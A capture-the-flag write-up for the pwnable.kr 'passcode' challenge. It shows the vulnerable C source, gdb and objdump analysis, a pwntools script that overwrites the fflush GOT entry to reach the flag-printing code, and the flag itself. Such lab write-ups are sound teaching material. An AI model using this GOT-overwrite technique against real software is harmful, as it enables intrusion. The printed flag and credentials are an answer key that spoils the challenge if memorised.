## Pwnable.kr
Target: passcode
SSH Connect: ssh passcode@pwnable.kr -p2222 (pw:guest)

### Code Overview
```
#include <stdio.h>
#include <stdlib.h>

void login(){
	int passcode1;
	int passcode2;

	printf("enter passcode1 : ");
	scanf("%d", passcode1);
	fflush(stdin);

	// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
	printf("enter passcode2 : ");
        scanf("%d", passcode2);

	printf("checking...\n");
	if(passcode1==123456 && passcode2==13371337){
                printf("Login OK!\n");
		setregid(getegid(), getegid());
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
		exit(0);
        }
}

void welcome(){
	char name[100];
	printf("enter you name : ");
	scanf("%100s", name);
	printf("Welcome %s!\n", name);
}

int main(){
	printf("Toddler's Secure Login System 1.1 beta.\n");

	welcome();
	login();

	// something after login...
	printf("Now I can safely trust you that you have credential :)\n");
	return 0;	
}

```

### Solution
#### First Attempt
```
passcode@ubuntu:~$ ./passcode
Toddler's Secure Login System 1.1 beta.
enter you name : hello
Welcome hello!
enter passcode1 : 123456
enter passcode2 : 1234
Segmentation fault (core dumped)
```

Since the gdb in the machine is broken, I scp the elf to my own machine

#### Second Attempt (Tried to use gdb)
Hints: Well, there were some compiler warnings, but who cares about that?
```
root@kali:~/home/documents# gcc -o pass passcode.c -Wall
passcode.c: In function ‘login’:
passcode.c:9:17: warning: format ‘%d’ expects argument of type ‘int *’, but argument 2 has type ‘int’ [-Wformat=]
    9 |         scanf("%d", passcode1);
      |                ~^   ~~~~~~~~~
      |                 |   |
      |                 |   int
      |                 int *
passcode.c:14:17: warning: format ‘%d’ expects argument of type ‘int *’, but argument 2 has type ‘int’ [-Wformat=]
   14 |         scanf("%d", passcode2);
      |                ~^   ~~~~~~~~~
      |                 |   |
      |                 |   int
      |                 int *
passcode.c:19:17: warning: implicit declaration of function ‘setregid’ [-Wimplicit-function-declaration]
   19 |                 setregid(getegid(), getegid());
      |                 ^~~~~~~~
passcode.c:19:26: warning: implicit declaration of function ‘getegid’ [-Wimplicit-function-declaration]
   19 |                 setregid(getegid(), getegid());
      |                          ^~~~~~~
passcode.c:9:9: warning: ‘passcode1’ is used uninitialized [-Wuninitialized]
    9 |         scanf("%d", passcode1);
      |         ^~~~~~~~~~~~~~~~~~~~~~
passcode.c:5:13: note: ‘passcode1’ was declared here
    5 |         int passcode1;
      |             ^~~~~~~~~
passcode.c:14:9: warning: ‘passcode2’ is used uninitialized [-Wuninitialized]
   14 |         scanf("%d", passcode2);
      |         ^~~~~~~~~~~~~~~~~~~~~~
passcode.c:6:13: note: ‘passcode2’ was declared here
    6 |         int passcode2;

```
This tells us that the scanf contains vulnerability since the second parameter of scanf is pointer to address, It is easy to see that there is arbitrary write vulnerability right in front of us

Apart from that, credited to Abdallah Elshinbary for the concept of "after a function stack frame is destroyed, the next function will start at the same base pointer". Thus maybe we could find the address of passcode1 or 2 is reused in the initial memory space of name.

disas login
```
   0x0804921e <+40>:	push   DWORD PTR [ebp-0x10]
   0x08049221 <+43>:	lea    eax,[ebx-0x1fe5]
   0x08049227 <+49>:	push   eax
   0x08049228 <+50>:	call   0x80490d0 <__isoc99_scanf@plt>
```
ebp-16 is the address used by passcode1

Use cyclic to quickly find the offset
```
>>> cyclic(100)
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
>>> cyclic_find(0x61616179)
96
```
```
Breakpoint 1, 0x08049345 in welcome ()
(gdb) x/30xw $esp
0xffffd5e0:	0x0804a07b	0xffffd5f8	0xf7f93d40	0x080492fe
0xffffd5f0:	0xf7f93d40	0x0804d1a0	0x61616161	0x61616162
0xffffd600:	0x61616163	0x61616164	0x61616165	0x61616166
0xffffd610:	0x61616167	0x61616168	0x61616169	0x6161616a
0xffffd620:	0x6161616b	0x6161616c	0x6161616d	0x6161616e
0xffffd630:	0x6161616f	0x61616170	0x61616171	0x61616172
0xffffd640:	0x61616173	0x61616174	0x61616175	0x61616176
0xffffd650:	0x61616177	0x61616178
(gdb) x/40xw $esp
0xffffd5e0:	0x0804a07b	0xffffd5f8	0xf7f93d40	0x080492fe
0xffffd5f0:	0xf7f93d40	0x0804d1a0	0x61616161	0x61616162
0xffffd600:	0x61616163	0x61616164	0x61616165	0x61616166
0xffffd610:	0x61616167	0x61616168	0x61616169	0x6161616a
0xffffd620:	0x6161616b	0x6161616c	0x6161616d	0x6161616e
0xffffd630:	0x6161616f	0x61616170	0x61616171	0x61616172
0xffffd640:	0x61616173	0x61616174	0x61616175	0x61616176
0xffffd650:	0x61616177	0x61616178	0x61616179	0x93a5ca00
0xffffd660:	0x0804a088	0x0804c000	0xffffd678	0x08049395
0xffffd670:	0xffffd690	0xf7f92e34	0x00000000	0xf7d92c65
(gdb) x/x ebp-16
No symbol table is loaded.  Use the "file" command.
(gdb) x/x $ebp-16
0xffffd658:	0x61616179
```

Therefore we can only write to the passcode1 not including passcode2

### What address to write to
Check the relocation table to identified what address to write to
```
objdump -R passcode
```
Since the fflush function will be called inside the login function, we may arbitrary write the fflush got table 
to the address we want to execute. When the fflush function is executed, the execution flow is hijacked to what we expected

```
0804c014 R_386_JUMP_SLOT   fflush@GLIBC_2.0
```

We can redirect the fflush to execute the below command
```
   0x080492a1 <+171>:	call   0x8049080 <getegid@plt>
   0x080492a6 <+176>:	mov    esi,eax
   0x080492a8 <+178>:	call   0x8049080 <getegid@plt>
   0x080492ad <+183>:	sub    esp,0x8
   0x080492b0 <+186>:	push   esi
   0x080492b1 <+187>:	push   eax
   0x080492b2 <+188>:	call   0x80490c0 <setregid@plt>
   0x080492b7 <+193>:	add    esp,0x10
   0x080492ba <+196>:	sub    esp,0xc
   0x080492bd <+199>:	lea    eax,[ebx-0x1fb9]
   0x080492c3 <+205>:	push   eax
   0x080492c4 <+206>:	call   0x80490a0 <system@plt>

```
We got all the tools we need. Let's write the code

### Code
```python
from pwn import *
import sys

buf = flat(
    "A"*96,
    0x0804c014,
    str(0x080492a1)
)
sys.stdout.buffer.write(buf)
```

```bash
python3 exp32.py | ./passcode
```

### Answer
s0rry_mom_I_just_ign0red_c0mp1ler_w4rning

### Result
```
passcode@ubuntu:~$ python3 /tmp/hello2/exp.py | ./passcode
Toddler's Secure Login System 1.1 beta.
/tmp/hello2/exp.py:4: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  buf = flat(
enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
s0rry_mom_I_just_ign0red_c0mp1ler_w4rning
enter passcode1 : Now I can safely trust you that you have credential :)

```

### Lefted Question
Still, I don't understand why sol.py won't work as expected as though it keep expecting smtg from user input (something about buffering). 